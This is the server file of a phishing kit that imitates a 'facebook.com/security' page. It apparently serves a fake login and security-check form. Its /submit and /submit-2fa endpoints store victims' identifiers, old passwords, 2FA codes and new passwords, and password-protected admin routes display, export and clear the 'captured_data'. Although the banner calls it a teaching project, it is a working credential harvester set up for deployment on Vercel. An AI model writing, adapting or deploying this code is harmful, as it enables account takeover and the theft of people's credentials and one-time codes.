const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

(function loadDotenv() {
  const files = [path.join(__dirname, '.env.local'), path.join(__dirname, '.env')];
  for (const file of files) {
    try {
      if (!fs.existsSync(file)) continue;
      const raw = fs.readFileSync(file, 'utf8');
      const lines = raw.split(/\r?\n/);
      for (const ln of lines) {
        const line = ln.trim();
        if (!line || line.startsWith('#')) continue;
        const eq = line.indexOf('=');
        if (eq < 1) continue;
        let k = line.slice(0, eq).trim();
        let v = line.slice(eq + 1).trim();
        if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) {
          v = v.slice(1, -1);
        }
        if (!(k in process.env)) process.env[k] = v;
      }
    } catch (e) {
      console.warn('[env] Impossible de lire ' + file, e && e.message);
    }
  }
})();

const { applyNoCache, confirmationHtml, twoFaHtml, renderAdmin, requireAdminAuth } = require('./api/_html');
const { getAll, addEntry, clearAll } = require('./api/_storage');

const PORT = process.env.PORT || 80;
const PUBLIC_DIR = path.join(__dirname, 'public');

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk.toString();
      if (data.length > 1e6) return reject(new Error('Body too large'));
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function parseBody(raw, contentType) {
  if (!raw) return {};
  try {
    if (contentType && contentType.includes('application/json')) return JSON.parse(raw);
    return new URLSearchParams(raw);
  } catch { return {}; }
}

function sendFile(res, filePath, statusCode = 200) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.statusCode = 500;
      return res.end('Server error');
    }
    const ext = path.extname(filePath).toLowerCase();
    const mime = {
      '.html': 'text/html; charset=utf-8',
      '.css': 'text/css; charset=utf-8',
      '.js': 'application/javascript; charset=utf-8',
      '.json': 'application/json; charset=utf-8',
      '.svg': 'image/svg+xml',
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.ico': 'image/x-icon'
    };
    res.statusCode = statusCode;
    res.setHeader('Content-Type', mime[ext] || 'application/octet-stream');
    res.end(data);
  });
}

const server = http.createServer(async (req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname.replace(/\/$/, '') || '/';

  if (req.method === 'POST' && (pathname === '/submit' || pathname === '/api/submit')) {
    applyNoCache(res);
    let body = {};
    try {
      const raw = await readBody(req);
      const parsedBody = parseBody(raw, req.headers['content-type']);
      body = parsedBody instanceof URLSearchParams ? Object.fromEntries(parsedBody) : parsedBody;
    } catch {}

    const entry = {
      timestamp: new Date().toLocaleString('fr-FR'),
      identifier: body.identifier || '',
      old_password: body.oldPassword || '',
      code_2fa: '',
      new_password: '',
      confirm_password: ''
    };

    try { await addEntry(entry); } catch (err) { console.warn('[submit]', err.message); }

    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.end(confirmationHtml);
  }

  if (req.method === 'POST' && (pathname === '/submit-2fa' || pathname === '/api/submit-2fa')) {
    applyNoCache(res);
    let body = {};
    try {
      const raw = await readBody(req);
      const parsedBody = parseBody(raw, req.headers['content-type']);
      body = parsedBody instanceof URLSearchParams ? Object.fromEntries(parsedBody) : parsedBody;
    } catch {}

    const entry = {
      timestamp: new Date().toLocaleString('fr-FR'),
      identifier: body.identifier || '',
      old_password: body.oldPassword || '',
      code_2fa: body.code_2fa || '',
      new_password: body.newPassword || '',
      confirm_password: body.confirmPassword || ''
    };

    try { await addEntry(entry); } catch (err) { console.warn('[submit-2fa]', err.message); }

    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.end(confirmationHtml);
  }

  if (pathname === '/admin') {
    if (!requireAdminAuth(req, res)) return;
    applyNoCache(res);
    let data = [];
    try { data = await getAll(); } catch {}
    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.end(renderAdmin(data));
  }

  if (pathname === '/admin/export' || pathname === '/api/admin/export') {
    if (!requireAdminAuth(req, res)) return;
    applyNoCache(res);
    let data = [];
    try { data = await getAll(); } catch {}
    const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
    res.statusCode = 200;
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="captured_data_${stamp}.json"`);
    return res.end(JSON.stringify(data, null, 2));
  }

  if (pathname === '/admin/clear' || pathname === '/api/admin/clear') {
    if (!requireAdminAuth(req, res)) return;
    applyNoCache(res);
    try { await clearAll(); } catch {}
    res.statusCode = 302;
    res.setHeader('Location', '/admin');
    return res.end();
  }

  if (pathname === '/' || pathname === '/security' || pathname === '/security/check' || pathname === '/login/identify') {
    return sendFile(res, path.join(PUBLIC_DIR, 'index.html'));
  }

  const safePath = path.normalize(pathname).replace(/^(\.\.[\/\\])+/, '');
  const filePath = path.join(PUBLIC_DIR, safePath);
  if (filePath.indexOf(PUBLIC_DIR) !== 0) {
    res.statusCode = 403;
    return res.end('Forbidden');
  }
  fs.stat(filePath, (err, stat) => {
    if (err || !stat.isFile()) {
      return sendFile(res, path.join(PUBLIC_DIR, 'index.html'), 200);
    }
    sendFile(res, filePath);
  });
});

server.listen(PORT, () => {
  console.log('\n==================================================');
  console.log('  facebook.com/security - Projet pedagogique');
  console.log('==================================================');
  console.log('');
  if (String(PORT) === '80') {
    console.log('  FORMULAIRE  : http://localhost/security');
    console.log('  PANEL ADMIN : http://localhost/admin');
  } else {
    console.log(`  FORMULAIRE  : http://localhost:${PORT}/security`);
    console.log(`  PANEL ADMIN : http://localhost:${PORT}/admin`);
  }
  console.log('');
  console.log('  Compatible VERCEL : fichiers dans ./api/*.js prets');
  console.log('  Donnees sauvegardees dans : captured_data.json (local)');
  console.log('                           ou KV Redis (sur Vercel)');
  console.log('');
  console.log('  Ctrl + C pour arreter');
  console.log('');
});
